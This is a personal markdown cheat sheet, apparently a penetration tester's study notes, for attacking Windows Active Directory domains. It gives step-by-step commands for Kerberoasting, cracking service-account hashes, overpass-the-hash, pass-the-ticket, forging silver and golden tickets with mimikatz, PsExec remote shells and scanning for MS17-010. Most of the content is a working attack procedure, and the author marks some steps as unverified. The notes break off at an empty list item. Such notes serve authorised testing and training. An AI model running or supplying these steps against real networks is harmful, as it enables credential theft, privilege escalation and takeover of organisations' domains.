## Windows Domain Exploitation

Follow Windows System instructions for privilege escalation before trying to exploit the domain.

#### Kerberoast (non-admin access)

1. Load `Invoke-Kerberoast.ps1` from the [Empire suite](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) into memory on Windows (remember to set the execution policy to unrestricted)

   ```bash
   powershell.exe -nop -exec bypass
   . .\Invoke-Kerberoast.ps1
   ```
   
2. Run the script

   ```powershell
   # JTR format output
   Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}
   
   # Hashcat and maybe also JTR - found this on a website
   Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath HashCapture.txt -Width 8000
   ```

3. It seems like the Hashcat output format works for either JTR or Hashcat, but for the John output format, examine the hash output and make sure there are no extra instances of `$krb5tgs$23$` inside the SPN section (which will occur if the SPN contains a colon).  There were only one instance of that string after the SPN and at the very beginning I had `$krb5tgs`.  If this is not right, it will cause JTR to not recognize the hash.  If you need to see the original hash, just run `Invoke-Kerberoast` by itself.  

4. Paste the hash into a file and feed it to JTR/Hashcat to start cracking.

   ```bash
   hashcat -m 13100 --force <TGSs_file> <passwords_file>
   
   john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
   ```

5. Check group memberships of cracked accounts:

   ```powershell
   net user USERNAME /domain
   ```

6. Attempt to use the accounts

   1. Remote Desktop:

      ```bash
      rdesktop 10.11.1.121 -u username -p password -d domain.com
      ```

   2. Pass the Ticket

   3. SMB
   
   4. PsExec

#### Overpass the Hash

1. Requires RDP access to a machine  and a privileged user's password hash (mimikatz, etc) on the machine

2. Use mimikatz to pass the hash and open a CLI window in the context of the privileged user (whoami will still show the original user)

   ```powershell
   sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe
   ```

3. In the new CLI window, access some resource to generate a TGT *(I'm not sure if this step is actually necessary)*

   ```powershell
   # Network share
   net use \\dc01
   ```

4. With a TGT and the admin user context, you can now use this CLI window to obtain code execution on remote servers the <u>user has access to</u>.

   ```powershell
   # Open a remote shell with SysInternals psexec
   .\psexec \\dc01 cmd.exe
   ```

#### Pass the Ticket 

1. From an admin prompt, uses mimikatz to dump the tickets on the system to see if a domain admin has logged into the PC and generated a ticket.  Tickets are dumped to kirbi files in the current directory.

   ```bash
   # Try listing tickets, not sure if they are guaranteed to show up here
   klist
   # Use mimikatz to dump them
   mimikatz.exe
   privilege::debug
   sekurlsa::tickets /export
   ```

2. If a domain admin's ticket is found, load the ticket for the current user session, then check the cached tickets to make sure it loaded

   ```powershell
   mimikatz.exe
   privilege::debug
   kerberos::ptt ticket.kirbi
   exit
   # Check cached tickets again
   klist
   ```

3. You should now be able to access resources as the domain admin within the current prompt. 
   Note:  You may need to use hostnames rather than IP addresses to access the resources.  If DNS is not available, use the `hosts` file.

   ```bash
   nltest /dc:dc01.mydomain
   ```

#### Silver Ticket

For obtaining a TGS ticket to use on remote systems, we craft a Silver Ticket using the NTLM of a service account, an SPN of a service, and customized group permissions.

1. Gain access to the password or NTLM hash of a service account for the target SPN (cracking with kerberoast or using mimikatz with )

2. Obtain Security Identifier for the Domain using the SID of the current user:

   ```powershell
   whoami /user
   ```

   The Domain SID is extracted by dropping the final section of the User SID:

   > Example:
   >
   > User SID =       S-1-5-21-4038953314-3014849035-1274281563-1103
   > Domain SID = S-1-5-21-4038953314-3014849035-1274281563

3. Use Mimikatz to purge any existing Kerberos tickets and verify the purge

   ```powershell
   kerberos::purge
   kerberos::list
   ```

4. Craft the silver ticket and load it into memory.  By default, the group memberships are set to local-admin and other highly privileged groups, including domain-admins.

   ```powershell
   # To generate the TGS with NTLM
   kerberos::golden /domain:<domain_name> /sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
   # Example
   kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:e2b475c11da2a0748290d87aa966c327 /ptt
   
   # Options
   /user:offsec 	# User requesting the TGS
   /domain:corp.com 	# Domain for the TGS
   /sid:S-1-5-21-4038953314-3014849035-1274281563 	# SID of the domain
   # Note: the SPN was HTTP/CorpWebServer.corp.com, so I'm not sure if it always breaks down to service/FQDN or not
   /target:CorpWebServer.corp.com 	# FQDN of the service
   /service:HTTP 	# Service type
   /rc4:e2b475c11da2a0748290d87aa966c327 	# Hash of service account for SPN
   /ptt	# Inject the ticket directly into memory now (rather than importing it in a second step)
   
   ##### Other options
   # To generate the TGS with AES 128 key
   kerberos::golden /domain:<domain_name> /sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
   
   # To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
   kerberos::golden /domain:<domain_name> /sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
   ```

5. Verify the ticket exists in memory

   ```powershell
   kerberos::list
   ```
   
6. You should now be able to perform actions against the target as the service account with privileged access.

##### Honestly, I'm not sure what the commands below were for.  So these items below need to be verified.

This page seems to have some good info on them though:  https://adsecurity.org/?p=2011

1. Export the ticket with mimikatz

   ```powershell
   sekurlsa::tickets /export
   ```

2. Inject a ticket into another Windows system with mimikatz that uses the same SPN

   ```powershell
   kerberos::ptt TICKET.KIRBI
   ```

3. Execute a command on a remote machine (I guess?)

   ```powershell
   .\PsExec.exe -accepteula \\<remote_hostname> cmd
   ```

#### Pass the Ticket (Golden Ticket)

A golden ticket is the same process as a silver ticket, except you will use the NTLM hash of the `krbtgt` account.  A golden ticket allows you to basically do anything you want.

### Domain Controller Attacks

1. Exploits: 
   Ex.  MS17–010, MS16–077, MS14–068 can be helpful to exploit a machine for privilege escalation if not patched.

   ```bash
   # Unverified nmap scan command
   nmap -Pn -p445 --open --max-host-group 3 --smb-vuln-ms17-010 script 10.10.0.2/16
   ```

2. 